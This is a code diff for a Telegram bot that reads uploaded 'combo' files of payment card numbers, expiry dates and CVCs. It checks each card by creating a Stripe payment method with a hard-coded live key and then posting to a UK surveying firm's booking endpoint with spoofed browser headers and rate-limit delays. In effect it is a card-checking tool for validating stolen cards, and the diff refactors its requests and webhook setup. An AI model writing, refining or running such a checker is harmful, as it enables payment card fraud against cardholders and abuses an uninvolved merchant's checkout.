@@ -83,7 +83,7 @@ async def handle_document(update: Update, context: CallbackContext) -> None:
                 processing_state['is_processing'] = False
                 return
             
-            # Start processing in background to avoid blocking
+            # Start processing in background
             asyncio.create_task(process_combo(update, context, filename))
             
         except Exception as e:
@@ -105,7 +105,7 @@ async def process_combo(update: Update, context: CallbackContext, combo_file: st
             await update.message.reply_text(f'🔍 Starting to check {total_lines} cards...')
             
             for i in range(processing_state['position'], total_lines):
-                processing_state['position'] = i
+                processing_state['position'] = i + 1
                 P = lines[i].strip()
                 
                 if not P or '|' not in P:
@@ -118,22 +118,30 @@ async def process_combo(update: Update, context: CallbackContext, combo_file: st
 
                     await asyncio.sleep(10)  # Rate limiting
                     
-                    # First API call
+                    # First API call to Stripe
                     headers = {
                         'authority': 'api.stripe.com',
                         'accept': 'application/json',
                         'content-type': 'application/x-www-form-urlencoded',
                         'origin': 'https://js.stripe.com',
                         'referer': 'https://js.stripe.com/',
-                        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                     }
 
-                    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_9sEidmFcTHYDfhGn3zZYH1wG00ZmolhPCV'
+                    data = {
+                        'type': 'card',
+                        'card[number]': n,
+                        'card[cvc]': cvc,
+                        'card[exp_month]': mm,
+                        'card[exp_year]': yy,
+                        'key': 'pk_live_9sEidmFcTHYDfhGn3zZYH1wG00ZmolhPCV'
+                    }
 
-                    r1 = requests.post('https://api.stripe.com/v1/payment_methods', 
-                                     headers=headers, 
-                                     data=data,
-                                     timeout=30)
+                    r1 = requests.post(
+                        'https://api.stripe.com/v1/payment_methods',
+                        headers=headers,
+                        data=data,
+                        timeout=30
+                    )
                     
                     try:
                         pm = r1.json()['id']
@@ -161,7 +169,7 @@ async def process_combo(update: Update, context: CallbackContext, combo_file: st
                         'origin': 'https://fpsurveying.co.uk',
                         'priority': 'u=1, i',
                         'referer': 'https://fpsurveying.co.uk/book/homebuyer-instruction-august-old/',
-                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
+                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                         'x-requested-with': 'XMLHttpRequest',
                     }
 
@@ -252,7 +260,6 @@ async def handle_text(update: Update, context: CallbackContext) -> None:
     """Handle text messages"""
     text = update.message.text.strip()
     
-    # If we're expecting token or chat ID but user sent raw text
     if 'token' not in context.user_data:
         await update.message.reply_text("Please set your bot token first using /token command")
     elif 'chat_id' not in context.user_data:
@@ -310,9 +317,17 @@ async def index():
     return 'KMZ Bot is running!'
 
 if __name__ == '__main__':
-    # Set webhook URL programmatically
+    # Set webhook URL - replace with your actual domain
     webhook_url = f"https://your-domain.com/{TOKEN}"
-    application.bot.set_webhook(webhook_url)
+    
+    # For Render.com, you might need to use their provided URL
+    # webhook_url = f"https://telebot-ep9a.onrender.com/{TOKEN}"
+    
+    try:
+        application.bot.set_webhook(webhook_url)
+        logger.info(f"Webhook set to: {webhook_url}")
+    except Exception as e:
+        logger.error(f"Error setting webhook: {e}")
     
     # Run Quart app
     app.run(host='0.0.0.0', port=8000)
